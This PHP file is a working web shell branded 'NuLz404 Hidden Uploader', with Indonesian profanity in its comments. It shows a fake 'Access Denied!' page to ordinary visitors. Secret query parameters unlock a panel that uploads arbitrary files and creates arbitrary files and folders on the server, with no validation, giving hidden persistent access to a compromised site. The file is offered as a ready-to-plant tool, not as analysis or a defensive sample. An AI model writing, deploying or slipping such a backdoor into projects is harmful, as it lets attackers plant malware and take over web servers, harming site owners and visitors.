<?php
//NuLz404
//Kalo Recode Nama gw jangan di Apus anjing
//Kontol Lu Semua
echo "<h1>Access Denied!</h1>";

//Upload Validation
if (isset($_POST['btn-upl'])) {
	$filename = $_FILES['upl']['name'];
	$location = $_FILES['upl']['tmp_name'];
	$dir = "";
	if (move_uploaded_file($location, $dir.$filename)) {
		echo "<script>alert('Upload Success :)')</script>";
	} else {
		echo "<script>alert('Upload Failed! :(')</script>";
	}
}

//Create File Validation
if (isset($_POST['buatfile'])) {
    $namafile = $_POST['namafile'];
    $isifile = $_POST['isifile'];
    $handle = fopen("$namafile", "w");
    if ($isifile) {
        $buatfile = fwrite($handle, $isifile);
    } else {
        $buatfile = $handle;
    }
    if ($buatfile) {
        echo "<script>alert('Berhasil Buat File :)');</script>";
    } else {
        echo "<script>alert('Gagal Buat File :(');</script>";
    }
}

//Create Dir Validation
if (isset($_POST['buatdir'])) {
    $namadir = $_POST['namadir'];
    $folder = preg_replace("([^\w\s\d\-_~,;:\[\]\(\].]|[\.]{2,})", '', $namadir);
    $buatfolder = mkdir($folder);
    if ($buatfolder) {
        echo "<script>alert('Berhasil Buat Folder :)');</script>";
    } else {
        echo "<script>alert('Gagal Buat Folder :(');</script>";
    }
}

if (isset($_GET['nulz'])) {
	if (isset($_GET['ganteng'])) {
        echo '
        <!DOCTYPE html>
        <html lang="en">
            <head>
            <title>.:NuLz404 Hidden Uploader:.</title>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta http-equiv="X-UA-Compatible" content="ie=edge">
                <meta name="description" content="This Is A Hidden Uploader">
                <meta name="author" content="NuLz404">
                <link rel="shortcut icon" href="https://nulz-archive.vercel.app/archive/nulz.ico" type="image/x-icon" />
                <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" type="text/css" />
                <link href="https://fonts.googleapis.com/css?family=Trade+Winds" rel="stylesheet" type="text/css" />
                <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
                <style>
                    body {
                        background: #000000;
                        display: flex;
                        flex-wrap: wrap;
                        justify-content: center;
                        align-items: center;
                        min-height: 100vh;
                    }
                    .root {
                        display: flex;
                        flex-wrap: wrap;
                        flex-direction: column;
                        justify-content: center;
                        align-items: center;
                        color: #eaeaea;
                        width: 100%;
                        height: auto;
                    }
                    .root h1 {
                        style="font-size: 3vh;
                        font-weight: 700;
                        font-family: Trade Winds;
                        text-shadow:0pt 0pt 10pt #fc0909,0pt 0pt 20pt #ffffff,0pt 0pt 30pt #fc0909;
                    }
                    .root form {
                        display: flex;
                        flex-direction: column;
                        flex-wrap: wrap;
                        justify-content: center;
                        align-items: center;
                    }
                    .root form button {
                        background: rgba(255,255,255,0.1);
                        color: #ffffff;
                        border: 1px solid #eaeaea;
                        border-radius: 10px;
                        background: ;
                        font-size: 2.50vh;
                        font-weight: 700;
                        padding: 5px 10px 5px;
                    }
                    .root form #btn-upl {
                        font-size: 4vh;
                        margin: 0;
                    }
                    .root form button:hover {
                        background: rgba(0,0,0,0.75);
                        box-shadow: 0 0 10pt rgba(255,0,0,0.50), 0 0 20pt rgba(255,0,0,0.75);
                    }
                </style>
            </head>
        <body>
            <div class="root">
                <div class="mb-4">
                    <a href="?nulz&ganteng"><button type="button" class="btn btn-outline-light">Home</button></a>
                    <a href="?nulz&ganteng&file"><button type="button" class="btn btn-outline-light">Buat File</button></a>
                    <a href="?nulz&ganteng&dir"><button type="button" class="btn btn-outline-light">Buat Folder</button></a>
                </div>
                <h1>NuLz404 Hidden Uploader</h1>
                <form action="" method="post" enctype="multipart/form-data">
                <div class="mb-3">
                    <label for="upl" style="color: #eaeaea; font-weight: 700; font-size: 4vh; margin: 1rem;">Upload File</label>
                    <input type="file" name="upl" id="upl">
                    <button type="submit" name="btn-upl" id="btn-upl">Upload</button>
                </div>'
            ?>
            <?php
                if (isset($_GET['file'])) {
                    echo '
                    <div class="mb-3">
                        <label for="namafile" class="form-label">Buat File</label>
                        <input type="text" class="form-control form-control-sm" name="namafile" id="namafile" placeholder="nama file">
                        <textarea class="form-control form-control-sm mt-3" name="isifile" rows="8" placeholder="isi file" id="isifile"></textarea>
                        <div class="mt-3 d-grid gap-2">
                            <input class="btn btn-outline-light" type="submit" name="buatfile" value="Buat File">
                        </div>
                    </div>
                    ';
                }
                if (isset($_GET['dir'])) {
                    echo '
                    <div class="mb-3">
                        <label for="namadir" class="form-label">Buat Folder</label>
                        <input type="text" class="form-control form-control-sm" name="namadir" id="namadir" placeholder="nama folder">
                        <div class="mt-3 d-grid gap-2">
                            <input class="btn btn-outline-light" type="submit" name="buatdir" value="Buat Folder">
                        </div>
                    </div>
                    ';
                }
            ?>
            <?php    
                '</form>
            </div>
        </body>
        </html>';
    }
}
?>